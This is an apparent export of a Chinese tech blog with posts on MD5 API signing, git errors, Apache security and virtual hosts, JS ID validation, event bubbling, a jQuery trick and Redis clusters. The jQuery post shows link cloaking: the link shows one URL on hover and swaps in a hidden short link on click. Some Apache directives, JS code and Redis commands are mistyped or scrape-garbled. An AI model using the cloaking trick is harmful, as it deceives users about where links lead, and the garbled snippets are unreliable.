<li><p>步骤三： 如果API在白名单中，那么现在就要检查用户的KEY是否正确了，服务端会有一张用户权限表，这个数据表主要用来记录用户的key secret(密钥) 以及API权限列表，检查这个用户对访问的API（openapi/v1/get/user/）是否有权限，如果有权限则通过，没权限则关闭。</p>
</li>
<li><p>步骤四： 如果用户权限通过，这个时候就到了最重要的一步，SIGN签名的验证。 签名算法： 加密方式 md5(POST参数（升序排序，除key sign参数除外） + 用户密钥) PHP加密算法代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foreach ($p as $v) &#123;  </span><br><span class="line">            $temp &#x3D; explode(&quot;&#x3D;&quot;, $v);  </span><br><span class="line">            $pArr[$temp[0]] &#x3D; $temp[1];  </span><br><span class="line">        &#125;  </span><br><span class="line">ksort($pArr);  </span><br><span class="line">        foreach ($pArr as $k &#x3D;&gt; $v) &#123;      </span><br><span class="line">            $pStr2 .&#x3D; $k . $v ;  </span><br><span class="line">        &#125;  </span><br><span class="line">md5($pStr2 . $secret)</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>注意：加密的时候，需要将timestamp带上，防止客户端篡改。</strong><br>客户端，将自己需要传递的参数进行升序排序，然后加上自己key对应的密钥（密钥在服务端数据库中有一份保存，这个是不能对外公开的）进行MD5加密，通过参数sign传递到服务端。 服务端拿到sign值后，对传递过来的参数也进行同样的算法排序，并经过用户的key查询得到密钥，然后进行一次加密算法，得到的服务端的sign和客户端传递过来的sign进行比较，如果相同则表示是可以通过的，如果中途有人篡改数据等，那么最终加密出来的sign就是不一致的，这样保证了用户传递数据的可靠性和安全性。</p>
<ol start="7">
<li>步骤五：检查时间戳时间，比较客户端时间和服务端时间是否在10分钟之内，如果10分钟之外了，那么返回超时的提示，这样能保证调用过的接口数据能在一定时间内销毁掉。 8. 步骤六：调用相应逻辑</li>
</ol>
]]></content>
      <categories>
        <category>WEB技术</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>程序设计</tag>
      </tags>
  </entry>
  <entry>
    <title>git pull 错误解决</title>
    <url>/2017/02/13/git-pull-%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<p>症状：pull的时候 $ <a href="http://lib.csdn.net/base/git" title="Git知识库">Git</a> pull</p>
<p>Pull is not possible because you have unmerged files.<br>Please, fix them up in the work tree, and then use ‘git add/rm <file>‘<br>as appropriate to mark resolution, or use ‘git commit -a’</p>
<p>应该是因为local文件冲突了 解决方法：  </p>
<blockquote>
<p>1.pull会使用git merge导致冲突，需要将冲突的文件resolve掉 git add -u, git commit之后才能成功pull. 2.如果想放弃本地的文件修改，可以使用git reset –hard FETCH_HEAD，FETCH_HEAD表示上一次成功git pull之后形成的commit点。然后git pull. 注意： git merge会形成MERGE-HEAD(FETCH-HEAD) 。git push会形成HEAD这样的引用。HEAD代表本地最近成功push后形成的引用。</p>
</blockquote>
<p>  就我的经验，有时候会莫名其妙地出现这种状况，而且Untracked files 还特别多（实际上自己可能只改了一两个文件），所以只好先保存好自己确定做出的local的修改，然后用git reset –hard FETCH_HEAD回到上次成功pull之后的点，然后再pull就没有问题了 2.You are not currently on a branch. 症状：有一次pull的时候又出现冲突，这回用“git reset –hard FETCH_HEAD”方法都不行了，出现：</p>
<p>$ git pull<br>You are not currently on a branch, so I cannot use any<br>‘branch.<branchname>.merge’ in your configuration file.<br>Please specify which remote branch you want to use on the command<br>line and try again (e.g. ‘git pull <repository> <refspec>‘).<br>See git-pull(1) for details.</p>
<p>解决方法： 首先git checkout -b temp 其次git checkout master 即可恢复到master repository的状态，然后就可以pull了</p>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>综合</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下apache安全配置策略</title>
    <url>/2017/02/13/linux%E4%B8%8Bapache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<blockquote>
<p>Apache具有灵活的设置，所有Apache的安全特性都要经过周密的设计与规划，进行认真地配置才能够实现。Apache安全配置包括很多层面，有运行环境、认证与授权设置等。Apache的安装配置和运行示例如下：</p>
</blockquote>
<p><strong>1、基本配置</strong> 1) 修改apache的版本信息，使外部访问看到的apache信息是经过伪装或错误的，这个可以尽可能的保证apache的安全。 2) 建立安全的apache的目录结构。ServerRoot  DocumentRoot  ScripAlias   Customlog  Errorlog   均放在单独的目录环境中。以上主要目录相互独立并且不存在父子逻辑关系。 3) ServerRoot目录只能具有管理权限用户访问；DocumentRoot能够被管理Web站点内容的用户访问和使用Apache服务器的Apache用户和Apache用户组访问；只有admin组的用户可以访问日志目录。  各个目录设置独立的权限 4) 禁止默认访问的存在，只对指定的目录开启访问权限。 5) 更改apache的默认路径，单独建立路径提供apache文件的存放 6) 通过使用例如“Apache DoS Evasive Maneuvers Module ”等工具来实现Apache服务器对DoS攻击的防范。其工具可以快速拒绝来自相同地址对同一URL的重复请求。 7) 以Nobody用户运行 一般情况下，Apache是由Root 来安装和运行的。如果Apache Server进程具有Root用户特权，那么它将给系统的安全构成很大的威胁，应确保Apache Server进程以最可能低的权限用户来运行。通过修改httpd.conf文件中的下列选项，以Nobody用户运行Apache 达到相对安全的目的。 User nobody <strong>2、ServerRoot目录的权限</strong> 为了确保所有的配置是适当的和安全的，需要严格控制Apache 主目录的访问权限，使非超级用户不能修改该目录中的内容。Apache 的主目录对应于Apache Server配置文件httpd.conf的Server Root控制项中，应为： Server Root /usr/local/apache <strong>3、SSI的配置</strong> 在配置文件access.conf 或httpd.conf中的确Options指令处加入Includes NO EXEC选项，用以禁用Apache Server 中的执行功能。避免用户直接执行Apache 服务器中的执行程序，而造成服务器系统的公开化。 Options Includes Noexec <strong>4、阻止用户修改系统设置</strong> 在Apache 服务器的配置文件中进行以下的设置，阻止用户建立、修改 .htaccess文件，防止用户超越能定义的系统安全特性。</p>
<p>AllowOveride None<br>Options None<br>Allow from all</p>
<p>然后再分别对特定的目录进行适当的配置。 <strong>5、改变Apache 服务器的确省访问特性</strong> Apache 的默认设置只能保障一定程度的安全，如果服务器能够通过正常的映射规则找到文件，那么客户端便会获取该文件，如<a href="http://local/">http://local</a> host/~ root/ 将允许用户访问整个文件系统。在服务器文件中加入如下内容：</p>
<p>order deny,ellow<br>Deny from all</p>
<p>将禁止对文件系统的缺省访问。 <strong>6、CGI脚本的安全考虑</strong> CGI脚本是一系列可以通过Web服务器来运行的程序。为了保证系统的安全性，应确保CGI的作者是可信的。对CGI而言，最好将其限制在一个特定的 目录下，如cgi-bin之下，便于管理；另外应该保证CGI目录下的文件是不可写的，避免一些欺骗性的程序驻留或混迹其中；如果能够给用户提供一个安全 性良好的CGI程序的模块作为参考，也许会减少许多不必要的麻烦和安全隐患；除去CGI目录下的所有非业务应用的脚本，以防异常的信息泄漏。 以上这些常用的举措可以给Apache Server 一个基本的安全运行环境，显然在具体实施上还要做进一步的细化分解，制定出符合实际应用的安全配置方案。 Apache Server基于主机的访问控制 Apache Server默认情况下的安全配置是拒绝一切访问。假定Apache Server内容存放在/usr/local/apache/share 目录下，下面的指令将实现这种设置：</p>
<p>Deny from all<br>Allow Override None</p>
<p>则禁止在任一目录下改变认证和访问控制方法。</p>
<blockquote>
<p>同样，可以用特有的命令Deny、Allow指定某些用户可以访问，哪些用户不能访问，提供一定的灵活性。当Deny、Allow一起用时，用命令Order决定Deny和Allow合用的顺序，如下所示：</p>
</blockquote>
<p>1、 拒绝某类地址的用户对服务器的访问权（Deny） 如：Deny from all</p>
<p>Deny from test.cnn.com<br>Deny from 204.168.190.13<br>Deny from 10.10.10.0/255.255.0.0</p>
<p>2、 允许某类地址的用户对服务器的访问权（Allow） 如：Allow from all Allow from test.cnn.com Allow from 204.168.190.13 Allow from 10.10.10.0/255.255.0.0 Deny和Allow指令后可以输入多个变量。 3、简单配置实例：</p>
<p>Order Allow, Deny<br>Allow from all<br>Deny from <a href="http://www.test.com/">www.test.com</a></p>
<p>指想让所有的人访问Apache服务器，但不希望来自<a href="http://www.test.com/">www.test.com</a>的任何访问。</p>
<p>Order Deny, Allow<br>Deny from all<br>Allow from test.cnn.com</p>
<p>指不想让所有人访问，但希望给test.cnn.com网站的来访。 Apache Sever的用户认证与授权 概括的讲，用户认证就是验证用户的身份的真实性，如用户帐号是否在数据库中，及用户帐号所对应的密码是否正确；用户授权表示检验有效用户是否被许可访 问特定的资源。在Apache中，几乎所有的安全模块实际上兼顾这两个方面。从安全的角度来看，用户的认证和授权相当于选择性访问控制。 <strong>建立用户的认证授权需要三个步骤：</strong> 1、建立用户库 用户名和口令列表需要存在于文件（mod_auth模块）或数据库（mod_auth_dbm模块）中。基于安全的原因，该文件不能存放在文挡的根目 录下。如，存放在/usr/local/etc/httpd下的users文件，其格式与UNIX口令文件格式相似，但口令是以加密的形式存放的。应用程 序htpasswd可以用来添加或更改程序： htpasswd –c /usr/local/etc/httpd/users martin -c表明添加新用户，martin为新添加的用户名，在程序执行过程中，两次输入口令回答。用户名和口令添加到users文件中。产生的用户文件有如下的形式： martin:WrU808BHQai36 jane:iABCQFQs40E8M art:FadHN3W753sSU 第一域是用户名，第二个域是用户密码。 2、配置服务器的保护域 为了使Apache服务器能够利用用户文件中的用户名和口令信息，需要设置保护域（Realm）。一个域实际上是站点的一部分（如一个目录、文档等） 或整个站点只供部分用户访问。在相关目录下的.htaccess文件或httpd.conf ( acces.conf ) 中的段中，由AuthName来指定被保护层的域。在.htaccess文件中对用户文件有效用户的授权访问及指定域保护有如下指定：</p>
<p>AuthName “restricted stuff”<br>Authtype Basic<br>AuthUserFile /usr/local/etc/httpd/users<br>Require valid-user</p>
<p>其中，AuthName指出了保护域的域名（Realm Name）。valid-user参数意味着user文件中的所有用户都是可用的。一旦用户输入了一个有效的用户/口令时，同一个域内的其他资源都可以利 用同样的用户/口令来进行访问，同样可以使两个不同的区域共用同样的用户/口令。 3、告诉服务器哪些用户拥有资源的访问权限 如果想将一资源的访问权限授予一组客户，可以将他们的名字都列在Require之后。最好的办法是利用组（group）文件。组的操作和标准的UNIX的组的概念类似，任一个用户可以属于一个和数个组。这样就可以在配置文件中利用Require对组赋予某些权限。如：</p>
<p>Require group staff<br>Require group staff admin<br>Require user adminuser</p>
<p>指定了一个组、几个组或一个用户的访问权限。</p>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache 配置虚拟主机</title>
    <url>/2017/02/12/apache-%E9%85%8D%E7%BD%AE%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA/</url>
    <content><![CDATA[<p> </p>
<h2 id="一、基于主机名"><a href="#一、基于主机名" class="headerlink" title="一、基于主机名"></a>一、基于主机名</h2><ol>
<li><p>设置域名映射同一个IP，修改hosts： 192.168.1.58 <a href="http://www.test1.com/">www.test1.com</a> 192.168.1.58 <a href="http://www.test2.com/">www.test2.com</a></p>
</li>
<li><p>跟上面一样，建立虚拟主机存放网页的根目录 /www/test1/1.html /www/test2/2.html</p>
</li>
<li><p>在httpd.conf中将附加配置文件httpd-vhosts.conf包含进来，接着在httpd-vhosts.conf中写入如下配置：为了使用基于域名的虚拟主机，必须指定服务器IP地址（和可能的端口）来使主机接受请求。可以用NameVirtualHost指令来进行配置。 如果服务器上所有的IP地址都会用到， 你可以用*作为NameVirtualHost的参数。在NameVirtualHost指令中指明IP地址并不会使服务器自动侦听那个IP地址。 这里设定的IP地址必须对应服务器上的一个网络接口。 下一步就是为你建立的每个虚拟主机设定<VirtualHost>配置块，<VirtualHost>的参数与NameVirtualHost指令的参数是一样的。每个<VirtualHost>定义块中，至少都会有一个ServerName指令来指定伺服哪个主机和一个DocumentRoot指令来说明这个主机的内容存在于文件系统的什么地方。如果在现有的web服务器上增加虚拟主机，必须也为现存的主机建造一个<VirtualHost>定义块。其中ServerName和DocumentRoot所包含的内容应该与全局的保持一致，且要放在配置文件的最前面，扮演默认主机的角色。</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line"></span><br><span class="line">　　ServerName www.test1.com</span><br><span class="line"></span><br><span class="line">　　DocumentRoot &#x2F;www&#x2F;test1&#x2F;</span><br><span class="line"></span><br><span class="line">　　&lt;Directory &quot;&#x2F;www&#x2F;test1&quot;&gt;</span><br><span class="line"></span><br><span class="line">　　　　Options Indexes FollowSymLinks</span><br><span class="line"></span><br><span class="line">　　　　AllowOverride None</span><br><span class="line"></span><br><span class="line">　　　　Order allow,deny</span><br><span class="line"></span><br><span class="line">　　　　Allow from all</span><br><span class="line"></span><br><span class="line">　　&lt;&#x2F;Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line"></span><br><span class="line">　　ServerName www.test2.com</span><br><span class="line"></span><br><span class="line">　　DocumentRoot &#x2F;www&#x2F;test2&#x2F;</span><br><span class="line"></span><br><span class="line">　　&lt;Directory &quot;&#x2F;www&#x2F;test2&quot;&gt;</span><br><span class="line"></span><br><span class="line">　　　　Options Indexes FollowSymLinks</span><br><span class="line"></span><br><span class="line">　　　　AllowOverride None</span><br><span class="line"></span><br><span class="line">　　　　Order allow,deny</span><br><span class="line"></span><br><span class="line">　　　　Allow from all</span><br><span class="line"></span><br><span class="line">　　&lt;&#x2F;Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>大功告成，测试下每个虚拟主机，分别访问<a href="http://www.test1.com、www.test2.com/">www.test1.com、www.test2.com</a></li>
</ol>
<h2 id="二、基于端口"><a href="#二、基于端口" class="headerlink" title="二、基于端口"></a>二、基于端口</h2><ol>
<li><p>修改配置文件 将原来的 Listen 80 改为 Listen 80 Listen 8080</p>
</li>
<li><p>更改虚拟主机设置： 复制代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost 192.168.1.10:80&gt;</span><br><span class="line">DocumentRoot &#x2F;var&#x2F;www&#x2F;test1&#x2F;</span><br><span class="line">ServerName www.test1.com</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost 192.168.1.10:8080&gt;</span><br><span class="line">DocumentRoot &#x2F;var&#x2F;www&#x2F;test2</span><br><span class="line">ServerName www.test2.com</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br></pre></td></tr></table></figure>
<p>##三、基于IP</p>
</li>
<li><p>假设服务器有个IP地址为192.168.1.10，使用ifconfig在同一个网络接口eth0上绑定2个IP：</p>
</li>
</ol>
<p>[root@localhost root]# ifconfig eth0:1 192.168.1.11 [root@localhost root]# ifconfig eth0:2 192.168.1.12</p>
<ol start="2">
<li>修改hosts文件，添加三个域名与之一一对应：</li>
</ol>
<p>192.168.1.11   <a href="http://www.test1.com/">www.test1.com</a> 192.168.1.12   <a href="http://www.test2.com/">www.test2.com</a></p>
<ol start="3">
<li>建立虚拟主机存放网页的根目录，如在/www目录下建立test1、test2、test3文件夹，其中分别存放1.html、2.html、3.html</li>
</ol>
<p>/www/test1/1.html /www/test2/2.html</p>
<ol start="4">
<li>在httpd.conf中将附加配置文件httpd-vhosts.conf包含进来，接着在httpd-vhosts.conf中写入如下配置：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost 192.168.1.11:80&gt;</span><br><span class="line">　　ServerName www.test1.com</span><br><span class="line">　　DocumentRoot &#x2F;www&#x2F;test1&#x2F;</span><br><span class="line">　　&lt;Directory &quot;&#x2F;www&#x2F;test1&quot;&gt;</span><br><span class="line"> 　　　　Options Indexes FollowSymLinks</span><br><span class="line">　　　　 AllowOverride None</span><br><span class="line">　　　　 Order allow,deny</span><br><span class="line">　　 　　Allow From All</span><br><span class="line"> 　 &lt;&#x2F;Directory&gt;</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost 192.168.1.12:80&gt;</span><br><span class="line">　　ServerName www.test1.com</span><br><span class="line">　　DocumentRoot &#x2F;www&#x2F;test2&#x2F;</span><br><span class="line">　　&lt;Directory &quot;&#x2F;www&#x2F;test2&quot;&gt;</span><br><span class="line"> 　　　　Options Indexes FollowSymLinks</span><br><span class="line">　　　　 AllowOverride None</span><br><span class="line">　　　　 Order allow,deny</span><br><span class="line">　　 　　Allow From All</span><br><span class="line"> 　 &lt;&#x2F;Directory&gt;</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br></pre></td></tr></table></figure></li>
<li>大功告成，测试下每个虚拟主机，分别访问<a href="http://www.test1.com、www.test2.com/">www.test1.com、www.test2.com</a></li>
</ol>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>JS身份证号码验证以及性别</title>
    <url>/2017/02/12/js%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81%E9%AA%8C%E8%AF%81%E4%BB%A5%E5%8F%8A%E6%80%A7%E5%88%AB/</url>
    <content><![CDATA[<p>  身份证验证在WEB开发中经常遇到，因为现在是新老身份证过渡期，所以判断身份证不光是要判断18位新身份证号码，还要照顾到15位的老身份证号，有些麻烦，不过掌握了Js算法，一切就简单了，本Js函数不但实现了15位、18位身份证号码的判断，而且还可判断男女是否和身份证相符。  </p>
<script language="javascript">
var powers=new Array("7","9","10","5","8","4","2","1","6","3","7","9","10","5","8","4","2");
var parityBit=new Array("1","0","X","9","8","7","6","5","4","3","2");
var sex="male";
function validId(obj){
    var _id=obj.value;
    if(_id=="")return;
    var _valid=false;
    if(_id.length==15){
        \_valid=validId15(\_id);
    }else if(_id.length==18){
        \_valid=validId18(\_id);
    }
    if(!_valid){
        alert("身份证号码有误,请检查!");
        obj.focus();
        return;
    }
    //设置性别
    var sexSel=document.getElementByIdx("sex");
    var options=sexSel.options;
    for(var i=0;i<options.length;i++){
        if(options\[i\].value==sex){
            options\[i\].selected=true;
            break;
        }
    }
}   
//18位的身份证号码验证
function validId18(_id){
    \_id=\_id+"";
    var \_num=\_id.substr(0,17);
    var \_parityBit=\_id.substr(17);
    var _power=0;
    for(var i=0;i< 17;i++){
        //校验每一位号码的合法性
        if(\_num.charAt(i)<'0'||\_num.charAt(i)>'9'){
            return false;
            break;
        }else{
            //加权
            \_power+=parseInt(\_num.charAt(i))*parseInt(powers\[i\]);
            //设置性别
            if(i==16&&parseInt(_num.charAt(i))%2==0){
                sex="female";
            }else{
                sex="male";
            }
        }
    }
    //取模
    var mod=parseInt(_power)%11;
    if(parityBit\[mod\]==_parityBit){
        return true;
    }
    return false;
}
//15位身份证校验
function validId15(_id){
    \_id=\_id+"";
    for(var i=0;i<_id.length;i++){
        //校验每一位身份证号码的合法性
        if(\_id.charAt(i)<'0'||\_id.charAt(i)>'9'){
            return false;
            break;
        }
    }
    var year=_id.substr(6,2);
    var month=_id.substr(8,2);
    var day=_id.substr(10,2);
    var sexBit=_id.substr(14);
    //校验年份位
    if(year<'01'||year >'90')return false;
    //校验月份
    if(month<'01'||month >'12')return false;
    //校验日
    if(day<'01'||day >'31')return false;
    //设置性别
    if(sexBit%2==0){
        sex="female";
    }else{
        sex="male";
    }
    return true;
}
</script>
<input type="text" onblur="validId(this)" maxlength="18" size="18">
<select id="sex">
    <option value="male">男</option>
    <option value="female">女</option>
</select>]]></content>
      <categories>
        <category>JAVAScript</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>阻止JS冒泡事件</title>
    <url>/2017/02/12/%E9%98%BB%E6%AD%A2js%E5%86%92%E6%B3%A1%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<p><strong>什么是JS事件冒泡？：</strong> 在一个对象上触发某类事件（比如单击onclick事件），如果此对象定义了此事件的处理程序，那么此事件就会调用这个处理程序，如果没有定义此事件处理程序或者事件返回true，那么这个事件会向这个对象的父级对象传播，从里到外，直至它被处理（父级对象所有同类事件都将被激活），或者它到达了对象层次的最顶层，即document对象（有些浏览器是window）。  <strong>解决方法</strong> 1.JavaScript 阻止事件冒泡，无使用其它插件来辅助，原生JS代码，考虑到浏览器的兼容性问题，这里对IE/火狐、Operating以及Chrome都有针对性的判断，代码如下：</p>
<p>function cancelBubble(evt) {<br>// 阻止事件冒泡<br>if (window.event) {<br>// Chrome,IE6,Opera<br>window.event.cancelBubble = true;<br>} else {<br>// FireFox 3<br>evt.stopPropagation();<br>}</p>
<p>2. 2.return false; 如果头部加入的是以下代码</p>
<script type="text/javascript">
$(function() {
　　$("#hr_three").click(function(event) {
　　　　return false;
　　});
});
<script>

再点击“点击我”，会弹出：我是最里层，但不会执行链接到百度页面]]></content>
      <categories>
        <category>JAVAScript</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>JQuery动态修改a标签链接地址</title>
    <url>/2017/02/10/jquery%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9a%E6%A0%87%E7%AD%BE%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80/</url>
    <content><![CDATA[<p>在一个项目中，想隐藏真实的链接地址，使用JQuery的事件可以解决这个问题，代码如下：</p>
<p>$(document).ready(function(){<br>    //动态修改href值<br>    $(“#aid”).mouseenter(function(){//鼠标划过或停留时显示正常地址，并保证点击后仍然显示正常地址<br>      $(this).attr(‘href’,’<a href="http://www.baidu.com/&#39;">http://www.baidu.com/&#39;</a>);<br>    }).click(function(){//链接被点击时打开实际地址<br>      $(this).attr(‘href’,’<a href="http://126.am/Ho9PX2&#39;">http://126.am/Ho9PX2&#39;</a>);<br>    });<br>});</p>
<p>代码执行的结果是，普通浏览者点击后会打开我们想要的地址，而不是显示的那个地址。如果同样的动作要执行多次，也可以封装成一个JQuery函数或插件，</p>
<p>$.fn.ChangeHref = function(show_url, click_url) {<br>    $(this).mouseenter(function(){<br>      $(this).attr(‘href’,show_url);<br>    }).click(function(){<br>      $(this).attr(‘href’,click_url);<br>    });<br>};</p>
<p>$(“#aid”).ChangeHref(‘<a href="http://www.baidu.com/">http://www.baidu.com/</a>, ‘<a href="http://126.am/Ho9PX2&#39;);//%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0">http://126.am/Ho9PX2&#39;);//调用函数</a></p>
]]></content>
      <categories>
        <category>JAVAScript</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>JQuery</tag>
      </tags>
  </entry>
  <entry>
    <title>redis-cluster安装和配置</title>
    <url>/2017/02/09/redis-cluster%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="介绍安装环境与版本"><a href="#介绍安装环境与版本" class="headerlink" title="介绍安装环境与版本"></a>介绍安装环境与版本</h2><blockquote>
<p>用两台虚拟机模拟6个节点，一台机器3个节点，创建出3 master、3 salve 环境。<br>redis 采用 redis-3.2.4 版本。<br>两台虚拟机都是 CentOS ，一台 CentOS6.5 （IP:192.168.31.245），一台 CentOS7（IP:192.168.31.210） 。</p>
</blockquote>
<h3 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</p></h3><h4 id="1-下载并解压"><a href="#1-下载并解压" class="headerlink" title="1. 下载并解压"></a>1. 下载并解压</h4><pre><code>    cd /root/software&lt;/code&gt;&lt;/div&gt;
    wget http://download.redis.io/releases/redis-3.2.4.tar.gz
    tar -zxvf redis-3.2.4.tar.gz</code></pre>
<h4 id="2-编译安装"><a href="#2-编译安装" class="headerlink" title="2. 编译安装"></a>2. 编译安装</h4><pre><code>    cd redis-3.24
    make
    make install</code></pre>
<h4 id="3-将-redis-trib-rb-复制到-usr-local-bin-目录下"><a href="#3-将-redis-trib-rb-复制到-usr-local-bin-目录下" class="headerlink" title="3.将 redis-trib.rb 复制到 /usr/local/bin 目录下"></a>3.将 redis-trib.rb 复制到 /usr/local/bin 目录下</h4><pre><code>    cd src
    cp redis-trib.rb /usr/local/bin/</code></pre>
<h4 id="4-创建-Redis-节点"><a href="#4-创建-Redis-节点" class="headerlink" title="4. 创建 Redis 节点"></a>4. 创建 Redis 节点</h4><pre><code>    首先在&amp;nbsp;192.168.31.245 机器上 /root/software/redis-3.2.4 目录下创建&amp;nbsp;redis_cluster 目录；
    mkdir redis_cluster
    在 redis_cluster 目录下，创建名为7000、7001、7002的目录，并将 redis.conf 拷贝到这三个目录中
    mkdir 7000 7001 7002
    cp redis.conf redis_cluster/7000
    cp redis.conf redis_cluster/7001
    cp redis.conf redis_cluster/7002</code></pre>
<ul>
<li><p>分别修改这三个配置文件，修改如下内容</p>
<pre><code>  port 7000 //端口7000,7002,7003

  bind 本机ip //默认ip为127.0.0.1 需要改为其他节点机器可访问的ip 否则创建集群时无法访问对应的端口，无法创建集群

  daemonize    yes //redis后台运行

  pidfile  /var/run/redis_7000.pid //pidfile文件对应7000,7001,7002

  cluster-enabled  yes //开启集群  把注释#去掉

  cluster-config-file  nodes_7000.conf //集群的配置  配置文件首次启动自动生成 7000,7001,7002

  cluster-node-timeout //请求超时  默认15秒，可自行设置

  appendonly  yes //aof日志开启 有需要就开启，它会每次写操作都记录一条日志</code></pre>
</li>
<li><p>接着在另外一台机器上（192.168.31.210），的操作重复以上三步，只是把目录改为7003、7004、7005，对应的配置文件也按照这个规则修改即可</p>
</li>
</ul>
<h4 id="5-启动各个节点"><a href="#5-启动各个节点" class="headerlink" title="5. 启动各个节点"></a>5. 启动各个节点</p></h4><ul>
<li><p>第一台机器上执行</p>
<pre><code>  redis-server redis_cluster/7000/redis.conf
  redis-server redis_cluster/7001/redis.conf
  redis-server redis_cluster/7002/redis.conf</code></pre>
</li>
<li><p>另外一台机器上执行</p>
<pre><code>  redis-server redis_cluster/7003/redis.conf
  redis-server redis_cluster/7004/redis.conf
  red redis 启动情况&lt;/p&gt;</code></pre>
<p>is-server redis_cluster/7005/redis.conf</p>
</li>
</ul>
<h4 id="6-检查"><a href="#6-检查" class="headerlink" title="6. 检查"></a>6. 检查</h4><pre><code>  &lt;!--hexoPostRenderEscape:&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span 